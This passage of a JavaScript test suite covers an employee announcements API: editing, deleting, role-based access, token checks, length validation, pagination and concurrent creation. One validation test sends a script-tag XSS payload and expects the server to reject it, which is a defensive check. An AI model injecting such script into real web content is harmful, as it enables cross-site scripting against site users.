        title: 'Updated Title',
        content: 'Updated content with new information'
      };

      const response = await request(app)
        .put(`/api/announcements/${testAnnouncement._id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send(updatedData);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);

      // Verify changes are reflected immediately
      const dashboardResponse = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(dashboardResponse.body[0].title).toBe('Updated Title');
      expect(dashboardResponse.body[0].content).toBe('Updated content with new information');
    });

    test('[TC-AN-005-HP] should allow admin to delete announcement', async () => {
      const response = await request(app)
        .delete(`/api/announcements/${testAnnouncement._id}`)
        .set('Authorization', `Bearer ${adminToken}`);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);

      // Verify announcement is no longer visible
      const dashboardResponse = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(dashboardResponse.body).toHaveLength(0);
    });

    test('[TC-AN-005-EP] should return 404 when trying to edit non-existent announcement', async () => {
      const response = await request(app)
        .put('/api/announcements/507f1f77bcf86cd799439011')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ title: 'Updated', content: 'Updated content' });

      expect(response.status).toBe(404);
      expect(response.body.success).toBe(false);
    });

    test('[TC-AN-005-EP] should handle database update failures during announcement edit', async () => {
      const originalFindByIdAndUpdate = Announcement.findByIdAndUpdate;
      Announcement.findByIdAndUpdate = jest.fn().mockRejectedValue(new Error('Database update failed'));

      const response = await request(app)
        .put(`/api/announcements/${testAnnouncement._id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ title: 'Updated', content: 'Updated content' });

      expect(response.status).toBe(500);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('Failed to update announcement');

      // Restore original method
      Announcement.findByIdAndUpdate = originalFindByIdAndUpdate;
    });

    test('[TC-AN-005-EP] should prevent non-admin users from editing announcements', async () => {
      const response = await request(app)
        .put(`/api/announcements/${testAnnouncement._id}`)
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({ title: 'Unauthorized Update' });

      expect(response.status).toBe(403);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toBe('Access denied. Admin privileges required.');
    });
  });

  describe('[TC-AN-006] No announcements scenario', () => {
    test('[TC-AN-006-HP] should return empty array when no active announcements exist', async () => {
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toEqual([]);
    });

    test('[TC-AN-006-HP] should not display inactive announcements to employees', async () => {
      await Announcement.create({
        title: 'Inactive Announcement',
        content: 'This should not be visible',
        createdBy: adminUser._id,
        isActive: false
      });

      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toEqual([]);
    });

    test('[TC-AN-006-EP] should handle system state with no announcements gracefully', async () => {
      // Ensure clean slate
      await Announcement.deleteMany({});

      // Test multiple user types
      const responses = await Promise.all([
        request(app).get('/api/announcements').set('Authorization', `Bearer ${employeeToken}`),
        request(app).get('/api/announcements').set('Authorization', `Bearer ${managerToken}`),
        request(app).get('/api/announcements/admin').set('Authorization', `Bearer ${adminToken}`)
      ]);

      responses.forEach(response => {
        expect(response.status).toBe(200);
        expect(response.body).toEqual([]);
      });
    });
  });

  describe('[TC-AN-007] Authentication and Authorization Edge Cases', () => {
    test('[TC-AN-007-EP] should reject requests without authentication token', async () => {
      const response = await request(app)
        .get('/api/announcements');

      expect(response.status).toBe(401);
      expect(response.body.error).toBe('Access token required');
    });

    test('[TC-AN-007-EP] should reject requests with invalid token', async () => {
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', 'Bearer invalid_token');

      expect(response.status).toBe(403);
      expect(response.body.error).toBe('Invalid or expired token');
    });

    test('[TC-AN-007-EP] should reject malformed authorization headers', async () => {
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', 'InvalidFormat token_here');

      expect(response.status).toBe(401);
      expect(response.body.error).toContain('Invalid authorization format');
    });

    test('[TC-AN-007-HP] should successfully authenticate with valid admin token', async () => {
      const response = await request(app)
        .get('/api/announcements/admin')
        .set('Authorization', `Bearer ${adminToken}`);

      expect(response.status).toBe(200);
    });
  });

  describe('[TC-AN-008] Data Validation Tests', () => {
    test('[TC-AN-008-EP] should validate announcement title length', async () => {
      const longTitle = 'A'.repeat(201);
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          title: longTitle,
          content: 'Valid content'
        });

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
    });

    test('[TC-AN-008-EP] should validate announcement content length', async () => {
      const longContent = 'A'.repeat(5001);
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          title: 'Valid title',
          content: longContent
        });

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
    });

    test('[TC-AN-008-EP] should reject announcements with special characters injection', async () => {
      const maliciousContent = '<script>alert("xss")</script>';
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          title: 'Test Title',
          content: maliciousContent
        });

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('Invalid content format');
    });

    test('[TC-AN-008-HP] should accept valid announcement data with proper formatting', async () => {
      const validData = {
        title: 'Valid Announcement Title',
        content: 'This is a valid announcement content with proper formatting and length.'
      };

      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(validData);

      expect(response.status).toBe(201);
      expect(response.body.success).toBe(true);
      expect(response.body.data.title).toBe(validData.title);
      expect(response.body.data.content).toBe(validData.content);
    });
  });

  describe('[TC-AN-009] Performance and Pagination Tests', () => {
    test('[TC-AN-009-HP] should handle large number of announcements efficiently', async () => {
      // Create multiple announcements
      const announcements = Array.from({ length: 50 }, (_, i) => ({
        title: `Announcement ${i + 1}`,
        content: `Content for announcement ${i + 1}`,
        createdBy: adminUser._id,
        isActive: true
      }));

      await Announcement.insertMany(announcements);

      const startTime = Date.now();
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);
      const endTime = Date.now();

      expect(response.status).toBe(200);
      expect(response.body.length).toBe(50);
      expect(endTime - startTime).toBeLessThan(1000); // Should respond within 1 second
    });

    test('[TC-AN-009-EP] should handle pagination parameters correctly', async () => {
      // Create test announcements
      await Announcement.insertMany([
        { title: 'Ann 1', content: 'Content 1', createdBy: adminUser._id, isActive: true },
        { title: 'Ann 2', content: 'Content 2', createdBy: adminUser._id, isActive: true },
        { title: 'Ann 3', content: 'Content 3', createdBy: adminUser._id, isActive: true }
      ]);

      const response = await request(app)
        .get('/api/announcements?page=1&limit=2')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      expect(response.body.length).toBeLessThanOrEqual(2);
    });
  });

  describe('[TC-AN-010] Real-time Updates and Notifications', () => {
    test('[TC-AN-010-HP] should immediately reflect new announcements to all users', async () => {
      // Create announcement
      const createResponse = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          title: 'Breaking News',
          content: 'Important update for all staff'
        });

      expect(createResponse.status).toBe(201);

      // Verify immediate visibility across different user types
      const [employeeView, managerView] = await Promise.all([
        request(app).get('/api/announcements').set('Authorization', `Bearer ${employeeToken}`),
        request(app).get('/api/announcements').set('Authorization', `Bearer ${managerToken}`)
      ]);

      expect(employeeView.status).toBe(200);
      expect(employeeView.body).toHaveLength(1);
      expect(employeeView.body[0].title).toBe('Breaking News');

      expect(managerView.status).toBe(200);
      expect(managerView.body).toHaveLength(1);
      expect(managerView.body[0].title).toBe('Breaking News');
    });

    test('[TC-AN-010-EP] should handle concurrent announcement creation attempts', async () => {
      const announcementPromises = Array.from({ length: 3 }, (_, i) =>
        request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: `Concurrent Announcement ${i + 1}`,
            content: `Content ${i + 1}`
          })
      );

      const responses = await Promise.all(announcementPromises);

      responses.forEach(response => {
        expect(response.status).toBe(201);
        expect(response.body.success).toBe(true);
      });

      // Verify all announcements are created
      const allAnnouncements = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(allAnnouncements.body).toHaveLength(3);
    });
  });
});